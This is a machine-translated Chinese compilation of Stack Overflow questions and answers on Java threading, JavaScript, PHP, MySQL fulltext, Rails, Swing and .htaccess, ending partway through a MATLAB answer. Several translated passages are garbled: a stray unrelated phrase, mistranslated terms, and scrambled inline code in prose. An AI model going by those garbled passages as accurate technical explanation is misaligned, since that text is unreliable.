# StackOverflow 问答 13490000-13490999

# multithreading - Java多线程两个生产者和1个消费者问题

> ID：13490000
> 
> 赞同：2
> 
> 时间：2012-11-21T09:25:27.977
> 
> 标签：multithreading

我需要解决多个生产者和一个消费者的问题。限制是我有两个生产者和一个消费者。消费者只有在收到来自两个生产者的通知时才应该开始处理。在那之前，消费者不应该做任何事情。但每个制片人独立工作，他们可以继续生产。你能帮我做这件事吗？汉语水平考试

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T09:27:20.553

创建两个[阻塞队列](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/BlockingQueue.html)- 每个生产者一个。消费者知道这两个队列，并尝试从每个队列中获取一个元素。（它可以通过取一个然后另一个来做到这一点。）当它从每个元素中获取一个元素时，它会处理它，然后重复。

您需要考虑如果一个生产者比另一个生产者快得多，您希望发生什么 - 您可能希望队列是有界的，并弄清楚如果一个生产者“填充”其队列时该怎么办。

# javascript - 简单测验中的 JavaScript 循环

> ID：13490002
> 
> 赞同：1
> 
> 时间：2012-11-21T09:25:37.887
> 
> 标签：javascript, arrays, loops, firebug

基于 JavaScript 的简单学校测验项目，这些是整个测验包含的文件：

*   **Quiz.html：** [http ://www.rapidimg.org/server/files/50ab9c326115cKAUf6S.png](http://www.rapidimg.org/server/files/50ab9c326115cKAUf6S.png)
*   **Quiz_questions.js：** [http](http://www.rapidimg.org/server/files/50ace68ad21d9GPIha7.png) ://www.rapidimg.org/server/files/50ace68ad21d9GPIha7.png （图像后面的随机字母显示它确实加载了答案）
*   **Quiz_functions.js：**这是它的主要内容，见下文。
*   **输出：** [http](http://www.rapidimg.org/server/files/50ace6c57c01aTsZpMk.png) ://www.rapidimg.org/server/files/50ace6c57c01aTsZpMk.png （这是正确的！）

它会加载一个带有相应答案的问题，因此可以正常工作。（见上面的输出）。现在，只要我通过选择或不选择答案单击“下一个问题”，就会发生两种不同的事情。

**未选择答案：** [http](http://www.rapidimg.org/server/files/50ace9123bce6TzoiqL.png) ://www.rapidimg.org/server/files/50ace9123bce6TzoiqL.png - 加载问题 2 + 答案，但将页面置于无限加载状态。当我点击另一个答案并点击“下一个问题”时，Firebug 显示：[http ://www.rapidimg.org/server/files/50ace9a08b88aqLFZ1K.png](http://www.rapidimg.org/server/files/50ace9a08b88aqLFZ1K.png)

**选择了一个答案：** [http](http://www.rapidimg.org/server/files/50acea1422aed6gZkcL.png) ://www.rapidimg.org/server/files/50acea1422aed6gZkcL.png - 加载问题 3 + 答案 (???) 但也将页面置于无限负载。单击答案+“下一个问题”按钮时出现与上述相同的错误：[http ://www.rapidimg.org/server/files/50acea4e4bc3cLn8g2U.png](http://www.rapidimg.org/server/files/50acea4e4bc3cLn8g2U.png)

**这是实现这一点的“quiz_functions.js”的代码：**

```
var useranswers = new Array();
var imgArray = new Array();
var answered = 0;
var currentQuestion = 0;

function renderQuizViaArray() 
{
    document.write('<h1>' + questions[currentQuestion] + '</h1>');

    for(i=0, j=choices[currentQuestion].length; i < j; i++)
    {
        document.writeln('<input type="radio" name="answer_' + currentQuestion + '" value="1" id="answer_' + currentQuestion + '_' + i + '" class="question_' + currentQuestion + '" onclick="submitAnswer(' + currentQuestion + ', this, \'question_' + currentQuestion + '\', \'label_' + currentQuestion + '_' + i + '\')" /><label id="label_' + currentQuestion + '_' + i + '" for="answer_' + currentQuestion + '_' + i + '"> ' + choices[currentQuestion][i] + '</label><br />');
    }

        document.write('<input type="submit" value="Next Question" onclick="nextQuestion()" />');
}

function nextQuestion()
{
    currentQuestion++;
    renderQuizViaArray();
}

function submitAnswer(questionId, obj, classId, labelId) 
{
  useranswers[questionId] = obj.value;
  document.getElementById(labelId).style.fontWeight = "bold";
  disableQuestion(classId);
  answered++;
}

function disableQuestion(classId) 
{
  var alltags = document.all? document.all : document.getElementsByTagName("*")
  for (i = 0; i < alltags.length; i++) 
  {
    if (alltags[i].className == classId) 
    {
      alltags[i].disabled = true;
    }
  }
} 
```

# c++ - 如何在 C++/CLI 项目中包含 JpegBitmapDecoder^

> ID：13490009
> 
> 赞同：0
> 
> 时间：2012-11-21T09:25:49.663
> 
> 标签：c++, visual-studio-2010, command-line-interface, jpeg

如主题中如何在 C++/CLI 项目中包含 JpegBitmapDecoder^。我试过 inlude 命名空间，但我得到：

```
Error   1   error C3083: 'Windows': the symbol to the left of a '::' must be a type C:\Users\Duke\Documents\Visual Studio 2010\Projects\Jpg\Jpg\Jpg.cpp 8   1   Jpg
Error   2   error C3083: 'Media': the symbol to the left of a '::' must be a type   C:\Users\Duke\Documents\Visual Studio 2010\Projects\Jpg\Jpg\Jpg.cpp 8   1   Jpg
Error   3   error C2039: 'Imaging' : is not a member of 'System'    C:\Users\Duke\Documents\Visual Studio 2010\Projects\Jpg\Jpg\Jpg.cpp 8   1   Jpg
Error   4   error C2871: 'Imaging' : a namespace with this name does not exist  C:\Users\Duke\Documents\Visual Studio 2010\Projects\Jpg\Jpg\Jpg.cpp 8   1   Jpg 
```

JPG

* * *

```
// Jpg.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#using <mscorlib.dll> //requires CLI
using namespace System;
using namespace System::IO;
using namespace System::Windows::Media::Imaging;

int _tmain(int argc, _TCHAR* argv[])
{

    // Open a Stream and decode a JPEG image
        Stream^ imageStreamSource = gcnew FileStream("C:\Users\Duke\Desktop\heart.jpg", FileMode::Open, FileAccess::Read, FileShare::Read);

        JpegBitmapDecoder^ decoder = gcnew JpegBitmapDecoder(imageStreamSource, BitmapCreateOptions::PreservePixelFormat, BitmapCacheOption::Default);//i want that decoder
        BitmapSource^ bitmapSource = decoder->Frames[0];//< --mamy bitmape

        // Draw the Image
        Image^ myImage = gcnew Image();
        myImage->Source = bitmapSource;
        myImage->Stretch = Stretch::None;
        myImage->Margin = System::Windows::Thickness(20);
        //

        int width = 128;
        int height = width;
        int stride = width / 8;
        array<System::Byte>^ pixels = gcnew array<System::Byte>(height * stride);

        // Define the image palette
        BitmapPalette^ myPalette = BitmapPalettes::Halftone256;

        // Creates a new empty image with the pre-defined palette.
        BitmapSource^ image = BitmapSource::Create(
           width, height,
           96, 96,
           PixelFormats::Indexed1,
           myPalette,
           pixels,
           stride);

        System::IO::FileStream^ stream = gcnew System::IO::FileStream("new.jpg", FileMode::Create);
        JpegBitmapEncoder^ encoder = gcnew JpegBitmapEncoder();
        TextBlock^ myTextBlock = gcnew System::Windows::Controls::TextBlock();
        myTextBlock->Text = "Codec Author is: " + encoder->CodecInfo->Author->ToString();
        encoder->FlipHorizontal = true;
        encoder->FlipVertical = false;
        encoder->QualityLevel = 30;
        encoder->Rotation = Rotation::Rotate90;
        encoder->Frames->Add(BitmapFrame::Create(image));
        encoder->Save(stream);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:27:13.373

改用这个：

```
using namespace System::Windows::Media::Imaging; 
```

显然，上面那行应该暗示在 C++/CLI 中，您使用`::`而不是`.`.

# php - 使用 jquery 发送帖子并加载特定的选择器

> ID：13490012
> 
> 赞同：0
> 
> 时间：2012-11-21T09:25:54.550
> 
> 标签：php, jquery, json, post

我想用 Jquery $.POST() 发布一个表单值并加载一个我不知道该怎么做的特定选择器可能是用 json 或类似的东西

```
$.post('topic.php', {id: id}, function(data){
    $("#message").html(data);
    $("#message").hide();
    $("#message").slideDown(500); //Fade in the data given by the topic.php file
}); 
```

我只想加载标题和描述而不是整个页面

我想在灯箱中检索此标题和描述，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:29:06.573

也许这会有所帮助：

```
$.post('topic.php', {id: id}, function(data){
    $("#message").html($(data).find("#your_dom_selector"));
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:30:15.127

```
$.post('topic.php', {
    id: id
}, function(data) {
    $("#message")
        .html($(data).('attr', 'title'))
        .hide()
        .slideDown(500); //Fade in the data given by the topic.php file
});
return false;
});​ 
```

# mysql - 全文搜索返回空结果时遇到问题

> ID：13490017
> 
> 赞同：0
> 
> 时间：2012-11-21T09:26:05.410
> 
> 标签：mysql

我在尝试对 mysql 中的表执行全文搜索时遇到问题。有问题的表具有以下创建命令：

```
CREATE TABLE IF NOT EXISTS `resume_contents` 
(`resumeid` int(100) NOT NULL AUTO_INCREMENT,
`jobseekerid` varchar(255) NOT NULL, 
`resumecontents` text, 
PRIMARY KEY (`resumeid`), 
UNIQUE KEY `jobseekerid` (`jobseekerid`), 
FULLTEXT KEY `resumecontents` (`resumecontents`) ) 
ENGINE=MyISAM  DEFAULT CHARSET=latin1 ; 
```

所以基本上只有 3 列，一列只有全文。然后，当我尝试使用以下命令进行全文搜索时：

```
SELECT *  FROM `resume_contents` WHERE MATCH (resumecontents) AGAINST('') 
```

无论反对子句中有什么词，我每次都会得到一个空的结果集。我在这里犯了什么愚蠢的错误？

例如，这里是我正在测试的一行，它有一个来自 resume.com 的简历样本。

```
INSERT INTO `resume_contents` (`resumeid`, `jobseekerid`, `resumecontents`) VALUES (2, '14', 'Objectives\nI am looking for a position at This Company where I can maximize my programming skills, project management, leadership skills, and create new and exciting tools.\n\n\nSummary\nI have had 3 years experience in web design and development. I am fimilar with a lot of the languages and software used in creating projects for the web. Futhermore, I have great project management skills and also work well either alone or with a group. I have also worked on small projects and large public releases for large companies.\n\n\nEducation\nDesign Media \nCollege Humor, Seattle, WA\nGraduated: January 2008 \nGrade: College\n\nEmployment History\nDecember 2007 – Present: Web Designer \nCompany: ComStream\nSeattle, Washington\nWorked as team lead on many different client projects.\n\n\nProfessional Skills\nAdobe Photoshop – Expert\n\nAdobe Illustrator – Expert\n\nAdobe Dreamweaver – Advanced\n\nPhp – Advanced\n\n\nQualification/Certification\nJanuary 2006: New Media Design \nOrganization: School of Technology\nAward: \nSan Fransico\nLanguages\nCzech – Beginner\n\nVietnamese – Conversational\n\n\nImmigration / Work Status\nDecember 2041 – Permanent Resident - United States'); 
```

然后我搜索：

```
SELECT * FROM `resume_contents` WHERE MATCH(`resumecontents`) AGAINST ('Company') 
```

或者我知道的任何单词或短语（任何长度，任何单词）都在那里......但它仍然返回一个空集。我知道它一定是我想念的简单的东西，但我不知道它可能是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:58:02.930

什么话？你知道，有些词不被认为是“the”或“how”，这些词似乎经常是有意义的。然后单词必须有最小长度。

**最后！**

> 此外，出现在 50% 或更多行中的单词被认为是常见的并且不匹配。

我敢打赌这里就是这种情况。在此处阅读更多相关信息[。](http://dev.mysql.com/doc/refman/5.1/en/fulltext-search.html)

# ruby-on-rails - Rails：编辑模型列

> ID：13490021
> 
> 赞同：1
> 
> 时间：2012-11-21T09:26:08.937
> 
> 标签：ruby-on-rails, model

我不确定为什么会这样，但其中一列以大写字母开头。我有点担心通过迁移来改变它，因为受影响的列是“comment_id”列，而评论是这个模型的父级。

```
 id | has_voted | Comment_id | created_at | updated_at
----+-----------+------------+------------+------------
(0 rows) 
```

这属于评论模型。可以删除 Comment_id 并通过生成新迁移来简单地添加 comment_id 列吗？还是我应该在其他地方修复它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T09:38:34.217

您可以生成一个新的迁移文件：

```
 rails g migration FixColumnName 
```

现在，编辑文件`../migrate/fix_column_name.rb`并更改`table_name`表的真实名称。

```
 class FixColumnName < ActiveRecord::Migration
    def change
    rename_column :table_name, :Comment_id, :comment_id
    end
  end 
```

来源：[如何在 Ruby on Rails 迁移中重命名数据库列？](https://stackoverflow.com/questions/1992019/how-can-i-rename-a-database-column-in-a-rails-migration)

# php - 如何选择多维数组中的第一个元素？

> ID：13490022
> 
> 赞同：5
> 
> 时间：2012-11-21T09:26:11.103
> 
> 标签：php, arrays, multidimensional-array

我有以下数组：

```
$extensions = array(
    '.info'     => array('whois.afilias.net','NOT FOUND'),  
    '.com'      => array('whois.verisign-grs.com','No match for'),
    '.net'      => array('whois.crsnic.net','No match for'),
    '.co.uk'    => array('whois.nic.uk','No match'),        
    '.nl'       => array('whois.domain-registry.nl','is free'),
); 
```

如何在没有 foreach 循环的情况下回显“.com”或“.co.uk”（不是“.com”或“.co.uk”内的数组，而只是 TLD）。`echo $extensions['.com'];`不起作用，因为这会返回： Array

**编辑：**我想选择键本身而不是数组编号。这可能吗？

提前致谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T09:27:54.540

```
print_r(array_keys($extensions)); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T09:27:15.123

php 5.4
`echo array_keys($extensions)[0];`

php 5.3
`$keys = array_keys($extensions); echo $keys[0];`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T09:33:51.603

如果你只想 1 个输出

```
$arrext = array_keys($extensions);
print_r($arrext[0]); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T09:36:49.567

只有在未知密钥时才需要回显密钥。如果您知道密钥，就像您在问题中描述的那样：“echo $extensions['.com'];” 您可能最好尝试一下： echo ".com";

但是，如果您不认识它们并且想要输出例如第一个，您可以这样做：

```
<?php
$extensions = array(
    '.info'     => array('whois.afilias.net','NOT FOUND'),
    '.com'      => array('whois.verisign-grs.com','No match for'),
    '.net'      => array('whois.crsnic.net','No match for'),
    '.co.uk'    => array('whois.nic.uk','No match'),
    '.nl'       => array('whois.domain-registry.nl','is free'),
);
$keys = array_keys($extensions);
echo $keys[0]; //will output ".info"
?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T09:35:45.247

使用[array_keys](http://php.net/manual/en/function.array-keys.php)将为您获取所有密钥。

例如，

```
 $array = array_keys($extensions); 

```

然后你可以简单地打电话

```
 print $array[0];    //displays .info
  echo $array[1];  // displays .com
  echo $array[2];  // displays .net 

```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-21T09:46:46.053

我认为您真正想要的是`key($extensions)`，问题是您无法使用 key() 选择数组位置，因此您必须使用循环或将所有键分配到一个新数组中，就像其他解决方案一样。

移动指针的唯一方法是使用`next()`、或`prev()`，它将指针 1 移动到数组的左/右位置，或数组的第一个/最后一个元素`reset()``end()`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-08-08T05:40:57.013

如果它对其他人有帮助，您也可以将其“速记”为：

```
echo array_keys($extensions)[0]; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-08-07T08:19:40.373

You could also the reset() function, which returns the first item in an array (and resets its internal pointer to the first element).

```
$keys = array_keys($extensions);
$first = reset($keys); 
```

# php - 在phpstorm的代码中查找所有$_post['az']模式的正则表达式？

> ID：13490023
> 
> 赞同：1
> 
> 时间：2012-11-21T09:26:15.510
> 
> 标签：php, regex, phpstorm

我想 `$_POST['a-z']`用`mysqli_real_escape_string($_POST['a-z'])`.

因此，替换将`mysqli_real_escape_string(`在开始和 `)`结束时添加`"]"`- 保持不变，所有这一切都在这之间 `['']`

在 phpstorm 中执行此操作的正则表达式是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:57:48.303

搜索模式：`(\$_POST\['[a-zA-Z0-9_-]+'\])`

替换字符串：`mysqli_real_escape_string($1)`

`$_POST['a-z']`这将替换, `$_POST['aaa']`,之类的字符串`$_POST['Hello-Pink_Kitten99']`。**如果您还需要匹配其他字符 - 根据需要调整模式。**

# jquery - 如何使用 php 为 jQuery 游戏计时

> ID：13490028
> 
> 赞同：0
> 
> 时间：2012-11-21T09:26:43.537
> 
> 标签：jquery

我正在创建一个 jQuery 游戏，玩家必须在尽可能快的时间内完成一项任务。我显示了一个计时器，以便用户知道他们完成任务需要多长时间。

我一直在阅读有关作弊/黑客行为的信息，似乎防止它的唯一方法是保留重要的逻辑服务器端。我选择的服务器端语言是 php。由于我的游戏的重要逻辑是花费的时间，我可以在游戏开始时设置一个计时器，并在游戏结束时通过 ajax 调用停止计时器。

我只是想知道如果在进行 ajax 调用和接收调用的服务器之间存在延迟该怎么办。假设用户在 12 秒内完成任务，但接收 ajax caqll 有 1 秒的延迟。写入高分表的值将是 13 秒，这会让玩家不开心！

服务器端计时器/ajax 调用的方式是去这里吗？我是否过于担心滞后？有没有更好的方法来安排比赛时间？

这是我第一次玩游戏，所以我不确定停止作弊的最佳方法！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:37:53.760

您无法停止以这种方式作弊，因为无论您如何尝试，任何按 F12 的人都可以编辑您页面上的 Javascript。

在服务器上设置计时器会使其不准确，因为每个人从脚本到服务器的延迟都会有所不同。我只是建议先制作游戏。

# java - Java：为什么我不能从另一个类的 jTextFields 中获取值？

> ID：13490029
> 
> 赞同：-2
> 
> 时间：2012-11-21T09:26:46.663
> 
> 标签：java, class, textfield

我正在尝试在 Java 中构建基于“MVC”的应用程序，我有 2 个类：1：函数和动作 2：按钮、Swing 元素

我想从 1 类访问到 2 类并执行特定操作。

**AccionesUsuarios.java**

```
public class AccionesUsuarios{

private static BaseDatos conn;
private static iniciarSesionw dataLogin;

public void iniciarSesion(){
    dataLogin = new iniciarSesionw();
    String usr = "", pwd = "";
    usr = dataLogin.textLoginUser.getText().trim();
    pwd = dataLogin.textLoginPass.getText().trim();

    System.out.println("Usuario: "+usr);
    System.out.println("Contraseña: "+pwd);
    /*try {
        conn.openConnection();

        /*dataLogin = new iniciarSesionw();
        String username = dataLogin.textLoginUser.getText();
        String password = dataLogin.textLoginPass.getText();

        ComandoBaseDatos comando = new ComandoBaseDatos("SELECT * FROM Usuarios_Operadores WHERE Usuario = '123' AND Clave = '123'");
        ResultSet rs = comando.SQLExecute();

        while (rs.next()) {
            JOptionPane.showMessageDialog(null, "Correcto!");
        }
        conn.closeConnection();
    } catch (SQLException ex) {
        conn.getSqlMessage(ex);
    }*/     
}
} 
```

**iniciarSessionw.java**

```
public class iniciarSesionw {

public JTextField textLoginUser;
public JTextField textLoginPass;
public JButton btnIngresar;

private static AccionesUsuarios au;

/*Launch the application */
public static void main(String[] args) {
    EventQueue.invokeLater(new Runnable() {
        public void run() {
            try {
                iniciarSesionw window = new iniciarSesionw();
                window.frmItcuautlaControl.setVisible(true);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    });
}

public iniciarSesionw() {
    initialize();
}

private void initialize() { 

            textLoginUser = new JTextField();
    textLoginUser.setBounds(185, 110, 153, 27);
    panel.add(textLoginUser);
    textLoginUser.setColumns(10);

    textLoginPass = new JTextField();
    textLoginPass.setColumns(10);
    textLoginPass.setBounds(185, 148, 153, 27);
    panel.add(textLoginPass);

            btnIngresar = new JButton("Ingresar");
    btnIngresar.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent arg0) {
            au = new AccionesUsuarios();
            au.iniciarSesion();

        }
    });
} 
```

**但是当textLoginUser**和**textLoginPass**的打印值为空时。

我希望我已经解释并提前感谢。

**编辑：**

用**@looper**回答解决了！！但是现在..取消注释 AccionesUsuarios.java 中包含与数据库的连接的部分并显示这些错误：

```
Exception in thread "AWT-EventQueue-0" java.lang.NullPointerException
at Controlador.AccionesUsuarios.iniciarSesion(AccionesUsuarios.java:43)
at Vista.iniciarSesionw$2.actionPerformed(iniciarSesionw.java:124)
at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2012)
at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2335)
at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:404)
at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
and more.... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T09:40:19.090

永远不会设置文本字段。您应该以其他方式获取内容：

```
btnIngresar = new JButton("Ingresar");
btnIngresar.addActionListener(new ActionListener() {
    public void actionPerformed(ActionEvent arg0) {
        au = new AccionesUsuarios();
        au.iniciarSesion(textLoginUser, textLoginPass);

    }
}); 
```

**AccionesUsuarios.java**

```
public void iniciarSesion(String user, String pass){
    dataLogin = new iniciarSesionw();
    String usr = "", pwd = "";
    usr = user.trim();
    pwd = pass.trim();

    System.out.println("Usuario: "+usr);
    System.out.println("Contraseña: "+pwd);
/*try {
        conn.openConnection();

        /*dataLogin = new iniciarSesionw();
        String username = usr;
        String password = pwd;

        ComandoBaseDatos comando = new ComandoBaseDatos("SELECT * FROM Usuarios_Operadores WHERE Usuario = '123' AND Clave = '123'");
        ResultSet rs = comando.SQLExecute();

        while (rs.next()) {
            JOptionPane.showMessageDialog(null, "Correcto!");
        }
        conn.closeConnection();
    } catch (SQLException ex) {
        conn.getSqlMessage(ex);
    }*/ 
```

正如 Capn Sparrow 指出的那样，您在 AccionesUsuarios.java 中创建了 iniciarSesionw-Class 的新实例，这会导致空值；）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:36:27.743

在 AccionesUsuarios 中执行此操作时：

```
dataLogin = new iniciarSesionw(); 
```

您正在创建 iniciarSesionw 类的新实例。因为它是一个不同的实例，所以它不会具有在另一个实例中设置的任何值。

相反，您可以尝试将引用传递给您的 iniciarSesionw 实例，如下所示：

**AccionesUsuarios.java**

```
public class AccionesUsuarios {

  private static BaseDatos conn;
  private iniciarSesionw dataLogin;  // note, I've removed the static keyword

  public AccionesUsuarios(iniciarSesionw dataLogin) {
    this.dataLogin = dataLogin;
  }

  ... 
```

**iniciarSessionw.java**

```
 public void actionPerformed(ActionEvent arg0) {
        au = new AccionesUsuarios( this ); 
```

# iphone - xcode 4.5中自动布局的用途是什么？

> ID：13490030
> 
> 赞同：3
> 
> 时间：2012-11-21T09:26:49.037
> 
> 标签：iphone, ios, xcode4.5

请给我描述 Xcode 4.5 中自动布局功能的使用。使用此功能我们可以获得什么样的优势？

# objective-c - iCarousel 禁用在后台完成的任何其他动画

> ID：13490031
> 
> 赞同：0
> 
> 时间：2012-11-21T09:26:49.677
> 
> 标签：objective-c, ios, animation, icarousel

我正在使用 Nick Lockwood 的 iCarousel 来显示图像，当旋转木马停在图像上时，我需要在旋转木马后面的背景之间进行过渡。我正在使用 UIView 的 animateWithDuration，问题是动画完成会立即发生，因为 iCarousel 正在调用 [CATransaction setDisableActions:YES];

我删除了iCarousel的Step方法中对disableAnimation和enableAnimation的调用，现在我的过渡动画效果很好，但是我担心现在会丢失一些功能或出现奇怪的错误。

任何人都可以对此表示同意或提出不同的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:43:16.037

[CATransaction setDisableActions:YES] 部分用于 Mac 支持，部分用于防止加载项目视图时出现奇怪的调整大小效果。如果您没有看到任何问题，那么禁用这些行可能是安全的，但如果您不必修改库，通常最好不要修改库，因为这会使以后升级到新版本变得更加困难。

你什么时候触发你的动画？如果您只希望在轮播停止时发生，那么正确的执行位置可能是

```
- (void)carouselDidEndScrollingAnimation:(iCarousel *)carousel; 
```

委托方法。如果你在那里这样做，你应该不会遇到动画停止的问题。如果您已经在那里执行此操作，并且仍然遇到问题，那么解决方法是将动画延迟到下一次 runloop 更新，您可以使用 GCD 执行此操作，如下所示：

```
dispatch_async(dispatch_get_main_queue(), ^{    
    //perform your animation code
}); 
```

# wpf - Chrome 中的 Windows Presentation Foundation 主机崩溃

> ID：13490035
> 
> 赞同：0
> 
> 时间：2012-11-21T09:26:57.040
> 
> 标签：wpf, google-chrome

我们有一个带有 XBAP 的应用程序，我们的一个用户只在 Chrome 上遇到错误。它无法加载 Windows Presentation Foundation 主机插件，尽管它显示在插件列表中。我们可以检查什么？它的胜利 XP 。

# linux - linux中的文件创建

> ID：13490038
> 
> 赞同：0
> 
> 时间：2012-11-21T09:27:03.827
> 
> 标签：linux, glassfish

我创建了一个应用程序，其中 android 手机拍照并将其上传到服务器。服务器接受图像，存储在本地目录中并更新数据库的路径。在我的本地主机（Windows）上一切正常，但是当我部署战争文件时，它没有创建文件。问题是我的本地主机在 Windows 上，但主服务器（ISP）在 Linux 上。我的本地主机和主服务器 (ISP) 都在使用 glassfish。在主服务器 (ISP) 上，我通过管理员登录，然后部署 war 文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:42:01.693

这可能是你的问题。

您将文件存储在服务器的什么位置。在 Windows 中，您可能会将路径指定为

```
D://images/dir1/...... 
```

在 linux 中，此路径无效。它应该看起来像

```
/home/tomcat/images/repo/........... 
```

请在您提到存储图像的目录位置的位置发布代码。

# javascript - Javascript无法识别“this”对象

> ID：13490039
> 
> 赞同：1
> 
> 时间：2012-11-21T09:27:05.407
> 
> 标签：javascript, html, prototype

请看这个小提琴：

[http://jsfiddle.net/GSHsH/9/](http://jsfiddle.net/GSHsH/9/)

HTML：

```
<div id="papa" onclick="anything(this);">Blabla</div>​ 
```

JS：

```
function anything(theObj){
    window.alert(theObj.innerHTML);
} 
```

我不明白为什么“任何东西”这个功能没有被重新识别。（使用原型）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T09:29:24.583

并不是说它无法识别 -由于您在 jsfiddle 中进行的设置，`this`它无法识别该方法- 将 javascript 范围限定为. 如果您选择它会正常工作：http: [//jsfiddle.net/GSHsH/11/](http://jsfiddle.net/GSHsH/11/)`anything``onLoad``no wrap (head)`

更详细一点。您设置它的方式，这就是注入到 jsfiddle 输出帧中的内容：

```
Event.observe(window, "load", function(){

function anything(theObj){
    window.alert(theObj.innerHTML);
}

}); 
```

请注意，该方法`anything`不在全局（窗口）范围内，而是在特定函数的范围内。这意味着它对页面上的元素不可见。

我设置它的方式你得到这个：

```
function anything(theObj){
    window.alert(theObj.innerHTML);
} 
```

这只是在页面头部定义的一个普通的旧函数 - 现在可以从页面上的元素访问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:35:29.650

这是因为 jsfiddle 会像这样生成您的代码：

```
Event.observe(window, "load", function(){
    function anything (theObj){
        window.alert(theObj.innerHTML);
    }
}); 
```

所以你的“任何东西”功能不在全球范围内。这将起作用：

```
window.anything = function (theObj){
    window.alert(theObj.innerHTML);
} 
```

# .htaccess - 管理员排除目录的 URL 重写

> ID：13490040
> 
> 赞同：0
> 
> 时间：2012-11-21T09:27:08.380
> 
> 标签：.htaccess, mod-rewrite, rewrite

我有一个 URL 重写设置来创建漂亮的 URL

```
RewriteCond %{REQUEST_URI} !^\/*(index\.php|blog|admin\/assets|site\/assets|robots.txt|sitemap.xml|products.xml|favicon\.ico)
RewriteRule ^(.*)$ /index.php?rq=$1 [L,QSA] 
```

当我使用`/admin`URL访问管理区域时，`/admin/?rq=admin`因为我有一个名为“admin”的根级目录而被重写。这可能很简单，但是我如何编辑（或添加）我的 .htaccess 规则，以便将 url 清晰地写为`/admin/`

更新：为了澄清，我想使用`/index.php?rq=admin`而不是通过调用 /admin/index.php来访问 /admin

这是我的 apache 虚拟主机配置：

```
<VirtualHost *:80>
        ServerAdmin alex
        ServerName hub
        ServerAlias hub
        DocumentRoot /var/www/hub/
        <Directory />
                Options FollowSymLinks
                AllowOverride All
        </Directory>
        <Directory /var/www/hub>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride All
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log

        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel warn

        CustomLog ${APACHE_LOG_DIR}/access.log combined

    Alias /doc/ "/usr/share/doc/"
    <Directory "/usr/share/doc/">
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    </Directory>

</VirtualHost> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:52:15.467

只需将该`admin`文件夹添加到`RewriteCond`. 现在，您有例外，`admin/assets`因此您可以删除该`assets`部分并为整个`admin`文件夹保留例外，如下所示：

```
RewriteEngine On
RewriteCond %{REQUEST_URI} !^\/*(index\.php|blog|admin|site\/assets|robots.txt|sitemap.xml|products.xml|favicon\.ico)
RewriteRule ^(.*)$ /index.php?rq=$1 [L,QSA] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T15:46:39.423

似乎添加`DirectorySlash Off`到我的 .htaccess 中就可以了。不确定这是否是正确的解决方法，但它解决了我的特定问题。我必须确保完全清除缓存以防止缓存重定向（感谢卡米尔）

在 Chrome 中：`Chrome-> Tools -> Clear Browsing Data -> Empty the Cache`

# matlab - Matlab：定义一个函数句柄，捕获函数的第二个返回值

> ID：13490042
> 
> 赞同：11
> 
> 时间：2012-11-21T09:27:14.310
> 
> 标签：matlab, function-handle

假设我有一个`foo`定义为的函数

```
 [a b] = foo(c ). 
```

如果我考虑一个函数句柄

```
 f = @(c)foo(c) 
```

例如在`cellfun`通话中使用，我得到的是与定义类似的`f`行为`foo`

```
 a = foo(c) 
```

即，返回的值`b`会丢失。

因此，当这样一个`f`被`cellfun`调用时，输出单元格将只有`a`s 并且会错过`b`s （我目前关心的）。*视觉上*

```
 cellfun(f,input)

  [a(input{1})]           ?
  [a(input{2})]           ?
     ....            b gets killed along the way 
```

* * *

**问题：**如何定义一个`foo`只*捕获*s的函数句柄`b`？即给出类似于`foo`like的定义的行为

```
 b = foo(c) 
```

即 ^2，*浪费*`a`s。

此外，是否有可能（有效地）在一个*独特的*`a`电话中同时捕捉到两者？`b` *`cellfun`*

 ** * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T10:45:23.433

从以下[文档`cellfun`](http://www.mathworks.se/help/matlab/ref/cellfun.html)：

